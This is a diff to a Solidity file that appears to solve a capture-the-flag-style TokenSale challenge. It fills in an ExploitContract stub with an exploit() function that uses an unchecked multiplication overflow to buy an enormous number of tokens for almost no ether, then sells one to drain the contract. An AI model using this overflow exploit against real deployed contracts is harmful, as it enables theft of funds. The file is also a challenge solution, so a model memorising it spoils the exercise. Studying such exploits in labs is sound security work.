@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+import "forge-std/Test.sol";
+
 contract TokenSale {
     mapping(address => uint256) public balanceOf;
     uint256 constant PRICE_PER_TOKEN = 1 ether;
@@ -41,6 +43,17 @@ contract ExploitContract {
         tokenSale = _tokenSale;
     }
 
-    receive() external payable {}
     // write your exploit functions below
+    function exploit() public payable {
+        uint numTokens = (type(uint256).max / 1 ether) + 1;
+        uint amount;
+        unchecked {
+            amount += numTokens * 1 ether;
+        }
+
+        tokenSale.buy{value: amount}(numTokens);
+        tokenSale.sell(1);
+    }
+
+    receive() external payable {}
 }
